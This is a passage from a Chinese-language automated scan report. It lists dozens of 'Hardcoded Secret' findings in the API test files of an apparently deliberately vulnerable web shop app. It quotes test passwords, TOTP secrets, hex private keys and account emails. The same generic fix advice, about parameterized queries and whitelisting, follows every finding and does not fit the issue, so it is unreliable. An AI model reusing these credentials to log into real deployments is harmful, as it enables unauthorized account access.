password: '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.67 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:181`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.68 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:182`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.69 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:213`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.70 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:214`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.71 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:239`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.72 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:240`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.73 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:257`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
initialToken: generateSync({ secret: 'OJQOJNTB46VLWUO4TVKXIULU2WLPFQOJ' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.74 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:265`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.75 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:266`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.76 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:291`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = 'EinBelegtesBrotMitSchinkenSCHINKEN!'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.77 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:292`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpSecret = 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.78 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:316`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.79 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:317`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.80 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:351`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.81 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:352`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpSecret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.82 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:378`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.83 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:379`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpSecret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.84 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:405`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const password = '123456'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.85 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:412`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
totpSecret: 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.86 Hardcoded Secret（HIGH）

- 文件：`test/api/address.test.ts:24`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.87 Hardcoded Secret（HIGH）

- 文件：`test/api/authenticated-users.test.ts:37`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.88 Hardcoded Secret（HIGH）

- 文件：`test/api/basket-item.test.ts:23`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.89 Hardcoded Secret（HIGH）

- 文件：`test/api/basket.test.ts:32`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.90 Hardcoded Secret（HIGH）

- 文件：`test/api/basket.test.ts:114`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.91 Hardcoded Secret（HIGH）

- 文件：`test/api/basket.test.ts:170`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.92 Hardcoded Secret（HIGH）

- 文件：`test/api/chat.test.ts:261`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.93 Hardcoded Secret（HIGH）

- 文件：`test/api/chat.test.ts:330`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'jim@juice-sh.op', password: 'ncc-1701' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.94 Hardcoded Secret（HIGH）

- 文件：`test/api/checkKeys.test.ts:35`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.send({ privateKey: 'lalalala' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.95 Hardcoded Secret（HIGH）

- 文件：`test/api/checkKeys.test.ts:46`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.send({ privateKey: '0x02c7a2a93289c9fbda5990bac6596993e9bb0a8d3f178175a80b7cfd983983f506' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.96 Hardcoded Secret（HIGH）

- 文件：`test/api/checkKeys.test.ts:57`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.send({ privateKey: '0x8343d2eb2B13A2495De435a1b15e85b98115Ce05' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.97 Hardcoded Secret（HIGH）

- 文件：`test/api/checkKeys.test.ts:68`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.send({ privateKey: '0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.98 Hardcoded Secret（HIGH）

- 文件：`test/api/data-export.test.ts:53`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.99 Hardcoded Secret（HIGH）

- 文件：`test/api/data-export.test.ts:73`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.100 Hardcoded Secret（HIGH）

- 文件：`test/api/data-export.test.ts:90`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.101 Hardcoded Secret（HIGH）

- 文件：`test/api/data-export.test.ts:110`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.102 Hardcoded Secret（HIGH）

- 文件：`test/api/data-export.test.ts:321`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: adminEmail, password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.103 Hardcoded Secret（HIGH）

- 文件：`test/api/data-export.test.ts:343`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: adminEmail, password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.104 Hardcoded Secret（HIGH）

- 文件：`test/api/data-export.test.ts:358`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: adminEmail, password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.105 Hardcoded Secret（HIGH）

- 文件：`test/api/delivery.test.ts:28`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.106 Hardcoded Secret（HIGH）

- 文件：`test/api/delivery.test.ts:54`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.107 Hardcoded Secret（HIGH）

- 文件：`test/api/delivery.test.ts:82`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.108 Hardcoded Secret（HIGH）

- 文件：`test/api/delivery.test.ts:115`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.109 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'OhG0dPlease1nsertLiquor!'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.110 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:40`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.111 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:55`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.112 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:70`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.113 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:85`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'OhG0dPlease1nsertLiquor!'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.114 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:110`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'Mr. N00dles'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.115 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:128`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'K1f.....................'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.116 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:146`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.117 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:165`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.118 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:183`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.119 Hardcoded Secret（HIGH）

- 文件：`test/api/deluxe.test.ts:201`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.120 Hardcoded Secret（HIGH）

- 文件：`test/api/erasure-request.test.ts:22`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern@owasp.org', password: 'kitten lesser pooch karate buffoon indoors' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.121 Hardcoded Secret（HIGH）

- 文件：`test/api/erasure-request.test.ts:34`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.122 Hardcoded Secret（HIGH）

- 文件：`test/api/erasure-request.test.ts:53`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.123 Hardcoded Secret（HIGH）

- 文件：`test/api/erasure-request.test.ts:66`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.send({ email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.124 Hardcoded Secret（HIGH）

- 文件：`test/api/erasure-request.test.ts:80`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.125 Hardcoded Secret（HIGH）

- 文件：`test/api/erasure-request.test.ts:91`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.126 Hardcoded Secret（HIGH）

- 文件：`test/api/erasure-request.test.ts:103`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'bjoern.kimminich@gmail.com', password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.127 Hardcoded Secret（HIGH）

- 文件：`test/api/feedback.test.ts:117`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.128 Hardcoded Secret（HIGH）

- 文件：`test/api/feedback.test.ts:143`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.129 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:27`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'kallliiii'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.130 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:36`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'kallliiii'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.131 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:52`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ooootto'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.132 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:76`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.133 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:90`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.134 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:104`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'Mr. N00dles'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.135 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:118`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'K1f.....................'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.136 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:132`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'EinBelegtesBrotMitSchinkenSCHINKEN!'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.137 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:147`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.138 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:245`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.139 Hardcoded Secret（HIGH）

- 文件：`test/api/login.test.ts:267`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.140 Hardcoded Secret（HIGH）

- 文件：`test/api/memory.test.ts:32`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.141 Hardcoded Secret（HIGH）

- 文件：`test/api/memory.test.ts:53`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.142 Hardcoded Secret（HIGH）

- 文件：`test/api/memory.test.ts:66`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.143 Hardcoded Secret（HIGH）

- 文件：`test/api/memory.test.ts:78`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.144 Hardcoded Secret（HIGH）

- 文件：`test/api/memory.test.ts:93`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.145 Hardcoded Secret（HIGH）

- 文件：`test/api/order-history.test.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.146 Hardcoded Secret（HIGH）

- 文件：`test/api/order-history.test.ts:56`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.147 Hardcoded Secret（HIGH）

- 文件：`test/api/order-history.test.ts:69`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.148 Hardcoded Secret（HIGH）

- 文件：`test/api/order-history.test.ts:82`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.149 Hardcoded Secret（HIGH）

- 文件：`test/api/order-history.test.ts:97`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.150 Hardcoded Secret（HIGH）

- 文件：`test/api/order-history.test.ts:111`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.151 Hardcoded Secret（HIGH）

- 文件：`test/api/order-history.test.ts:125`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.152 Hardcoded Secret（HIGH）

- 文件：`test/api/password.test.ts:28`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'kunigunde'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.153 Hardcoded Secret（HIGH）

- 文件：`test/api/password.test.ts:32`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'kuni@be.rt', password: 'kunigunde' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.154 Hardcoded Secret（HIGH）

- 文件：`test/api/password.test.ts:44`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'monkey summer birthday are all bad passwords but work just fine in a long passphrase'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.155 Hardcoded Secret（HIGH）

- 文件：`test/api/password.test.ts:95`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
